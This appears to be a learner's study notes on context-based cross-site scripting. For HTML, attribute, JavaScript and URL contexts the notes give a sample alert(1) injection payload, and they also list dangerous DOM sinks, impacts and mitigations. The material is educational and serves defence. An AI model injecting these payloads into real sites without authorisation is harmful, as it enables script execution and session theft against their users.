# Context-Based Cross-Site Scripting (XSS)

## Overview

Context-based XSS focuses on understanding where user input is reflected inside the HTML, JavaScript, CSS, or attribute structure of a web application.

Different contexts require different payloads for successful execution.

---

## Key Concepts Learned

- HTML context injection
- Attribute context injection
- JavaScript context injection
- URL context injection
- CSS context awareness
- Browser parsing behavior

---

# Major XSS Contexts

## 1. HTML Context

User input appears directly inside page HTML.

### Example

```html
<div>USER_INPUT</div>
```

### Payload

```html
<script>alert(1)</script>
```

---

## 2. Attribute Context

User input appears inside an HTML attribute.

### Example

```html
<input value="USER_INPUT">
```

### Payload

```html
" onfocus="alert(1)
```

---

## 3. JavaScript Context

User input appears inside JavaScript code.

### Example

```javascript
var name = "USER_INPUT";
```

### Payload

```javascript
";alert(1);//
```

---

## 4. URL Context

User input appears inside URLs or hyperlinks.

### Example

```html
<a href="USER_INPUT">
```

### Payload

```javascript
javascript:alert(1)
```

---

## 5. DOM Context

Client-side JavaScript inserts user input dynamically into the DOM.

### Dangerous Sinks

```javascript
innerHTML
document.write()
eval()
```

---

## Observations

- Successful XSS depends heavily on injection context.
- One payload does not work everywhere.
- Browser parsing rules influence exploitability.
- Context analysis is a core skill in real-world testing.

---

## Security Impact

- JavaScript execution
- Session hijacking
- Credential theft
- Browser compromise
- User impersonation

---

## Mitigation

- Context-aware output encoding
- Secure templating frameworks
- Input validation
- CSP implementation
- Avoid dangerous JavaScript sinks

---

## Skills Practiced

- Reflection point analysis
- Payload adaptation
- Browser context understanding
- Client-side execution tracing
- Secure rendering analysis
